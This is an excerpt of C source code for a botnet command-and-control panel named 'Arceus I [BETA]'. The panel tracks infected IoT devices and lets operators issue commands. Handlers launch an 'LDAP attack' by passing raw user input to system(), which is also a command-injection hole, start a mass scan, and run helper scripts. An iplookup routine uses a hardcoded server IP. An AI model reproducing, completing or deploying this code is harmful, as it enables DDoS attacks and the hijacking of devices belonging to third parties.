  ...
  return total; // Return Statement Terminates The Execution Of a Function And Returns Control To The Calling Function
    ...
    void *titleWriter(void *sock) // We Shall Create A Window Title For The Screen
    {
        ...
        while(1) // While == Wait 1 Second, This Is Stable
        {
            ...
            sprintf(string, "%c]0; Arceus I [BETA] | IoT Devices: %d | Administrators: %d %c", '\033', clientsConnected(), managesConnected, '\007'); // [Title]
...
if (strstr(buf, ".ldap") || strstr(buf, ".LDAP")) // System Command Function -- [TESTING HERE]
         {
        char *token = strtok(buf, "                    ");
        char *iptarget = token+sizeof(token);
        trim(iptarget);
        char *ipkill[5000];
        trim(ipkill);
        sprintf(ipkill, "%s                   ", iptarget);
        system(ipkill);
        sprintf(botnet, "\e[38;5;93m [Arceus] LDAP Attack Has Been Sent..\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
        }
        ...
        {
        if(strcmp(owner, accounts[find_line].id) == 0) // Check If User Is Owner
        {
        char command[50];
        trim(command);
        strcpy(command, "python arc.py" );
        system(command);
        sprintf(botnet, "\e[38;5;93m Test Command Engaged Into System Successfully.. I think..\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
      }
      else
      {
        ...
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1); // Each Line Set on [MSG_NOSIGNAL] - Broadcast
                ...
                if (strstr(buf, ".scan") || strstr(buf, ".SCAN")) // System Command Function -- [TESTING HERE]
        {
        if(strcmp(owner, accounts[find_line].id) == 0) // Check If User Is Owner
        {
        char command[50];
        ...
        system(command);
        sprintf(botnet, "\e[38;5;93m Starting Mass-Scan!\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
      }
      else
      {
        ...
        else if (strstr(buf, ".test") || strstr(buf, ".TEST")) // System Command Function -- [TESTING HERE]
         {        
        char command[50];
        trim(command);
        strcpy(command, "./ac.sh" );
        system(command);
        sprintf(botnet, "\e[38;5;93m Test Command Engaged Into System Successfully.. I think..\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
        }
        else if(strstr(buf, "iplookup") || strstr(buf, "IPLOOKUP"))
        {
            ...
            if(atoi(myhost) >= 8) // Bigger Than Int Value Of 8
            {
                ...
                char *iplookup_host = "23.254.244.244"; // Change to Server IP - [EDIT HERE]
